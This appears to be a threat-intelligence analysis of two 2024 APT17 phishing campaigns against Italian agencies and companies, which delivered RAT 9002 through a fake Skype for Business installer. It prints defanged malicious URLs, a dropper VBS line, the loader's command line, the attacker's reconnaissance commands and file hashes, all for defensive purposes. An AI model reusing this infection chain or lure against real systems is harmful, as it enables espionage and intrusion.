Italian government agencies and companies in the target of a
Chinese AP
On June 24 and July 2, 2024, two targeted attacks on Italian companies and government entities were
observed by a Chinese cyber actor exploiting a variant of the Rat 9002 in diskless mode. Other variants
have over time been named as Rat 3102. These activities are associated with the APT17 group also
known as "DeputyDog".
The first campaign on June 24, 2024 used an Office document, while the second campaign contained a
link.
Both campaigns invited the victim to install a Skype for Business package from a link of an Italian
government-like domain to convey a variant of Rat 9002.
Rat 9002 and Rat 3102 are notoriously linked to APT17, a Chinese cyber-criminal group known for:

Operation Aurora (attributed to the Chinese government)
Operation Ephemeral Hydra
targeted attacks on companies and government entities
The campaigns
In the figure the image of the Office document "GUIDA OPERATIVA PER l’UTENTE.docx" spreaded in
the June 24, 2024 campaign.

https://meeting[.]equitaligaiustizia[.]it/angelo.maisto.guest
The Word document was created on June 18, 2024 by a user named "ple".

The July 2 campaign instead directly uses a link to the malicious URL.

Both campaigns invite the victim to connect to the following page:
3/9
The site mimics an official page for Equitalia Giustizia meetings and invites the user to download a
customized MSI installation package for the Skype for Business software. There is also another
legitimate link on the page: https://meeting[.]equitaliagiustizia[.]it/angelo.maisto.guest/MB9GVM5K which
was most likely stolen/intercepted in a possible previous attack.
Malicious URL details:
DOMAIN
meeting[.]equitaligaiustizia[.]it
Domain creation date
2024-06-13
By accessing the root of the site, only the "angelo.maisto.guest" subfolder is present as can be seen from
the image below:
Instead, the malicious package is downloaded from the following Microsoft URL:
https://skypeformeeting[.]file[.]core[.]windows[.]net/skypeformeeting/SkypeMeeting.msi?

The custom MSI package that is downloaded has the following features:

Name: SkypeMeeting.msi

Set Args = WScript.Arguments

strCommand1 = "java.exe -jar """ & Args(0) & """ """ & Args(1) & """ """ & Args(2) & """"

Infection chain
In the downloaded MSI package some files to be considered interesting are the following:
SkypeMeetingsApp.msi (original MSI package for installing Skype for Business)
vcruntime.jar
vcruntime.vbs
vcruntime.bin
Below is a graph of the infection chain of the campaigns observed:
The execution of SkypeMeeting.msi will therefore involve the installation of the original Skype for
Business package and the execution of the Java application called "vcruntime.jar" via the VBS script
"vcruntime.vbs" which we see below:
The Java application will then be executed with the following command line:
java.exe -jar "C:\Users\<redacted>\AppData\Roaming\jre-1.8\bin\vcruntime.jar" "dwrsvsa"
5/9
"C:\Users\<redacted>\AppData\Roaming\jre-1.8\bin\vcruntime.bin"
The "vcruntime.bin" file, of which we see an excerpt below, contains a shellcode encrypted with RC4:

The Java application decrypts and executes the shellcode. Below we see the first step which involves
deciphering through a simple XOR cycle:
After decryption, the shellcode decompresses and executes the RAT 9002 as we see in the figure:
The RAT 9002
The RAT 9002 performs proxy functions to monitor network traffic, see below some excerpts from the
malware dump:
6/9
In this first excerpt we see the command and control server.
In this second excerpt we see the string "Dog create a loop thread" characteristic of the RAT 9002.
In this third extract we see the name of the RAT project.

The variant of RAT 9002 analyzed contains the value "20240124" as a date indicator as seen in the figure
below:
7/9
This value indicates that the malware, although old, continues to be actively developed in 2024.
The RAT 9002 Trojan is a modular malware that, based on the cyber actor's needs, downloads additional
diskless plugins that allow various features to be added to the malware. During the analysis of the sample
in question, the criminal submitted the following additional forms:
ScreenSpyS.dll -> screen capture [creation date: 2018-07-19 06:27:00]
RemoteShellS.dll -> execution of programs [creation date: 2022-01-23 04:48:12]
UnInstallS.dll -> uninstallation [creation date: 2012-01-11 10:20:09]
FileManagerS.dll -> browse files [creation date: 2022-01-21 10:35:49]
ProcessS.dll -> process management [data creazione: 2022-01-22 01:37:08]
Using the RemoteShellS module, the cybercriminal executed the following commands to discover the
network:
systeminfo.exe
ipconfig /all
net user
netstat -ano -p tcp
net use
net view \\<redacted_ip>
ping <redacted_ip> -n 1
The analyzed sample communicates with its command and control server hosted on a domain that
simulates a Microsoft domain, below are the details of the C&C server:

Thanks to Threat intelligence activities it was possible to correlate an executable file that was uploaded to
VirusTotal from Italy on 5 July 2024 which appears to be the executable file version of RAT 9002.

Name: a.exe

Size: 35328 byte

Creation date: 2024-07-04 17:02:45

SHA-256:de19e0163af15585c305f845b90262aee3c2bdf037f9fc733d3f1b379d00edd0

This sample also contains the value "20240124" as a date indicator. This sample may have been used to
persist on an affected machine.
Conclusions
The two campaigns appear to be aimed at a government and/or corporate target.

The RAT 9002 used is associated with the Chinese cyber-criminal group APT17 called DeputyDog which
appears to have been active since at least 2008. The malware appears to be constantly updated with
diskless variants as well. It is composed of various modules that are activated as needed by the cyber
actor so as to reduce the possibility of interception.

The attack as a whole is particularly sophisticated and designed down to the smallest detail, the domains
used are very similar to official domains and even the creation of the malicious MSI package was carried
out with care as it involves the installation of the legitimate Skype for Business software and in parallel
the diskless version of the RAT 9002.

The initial MSI file is downloaded from a Microsoft distribution site to reduce the possibility of interception.

The use of legitimate links from government entities on the malicious page suggests that the cyber actor
had access to confidential information of some user belonging to previously affected Italian companies or
entities.
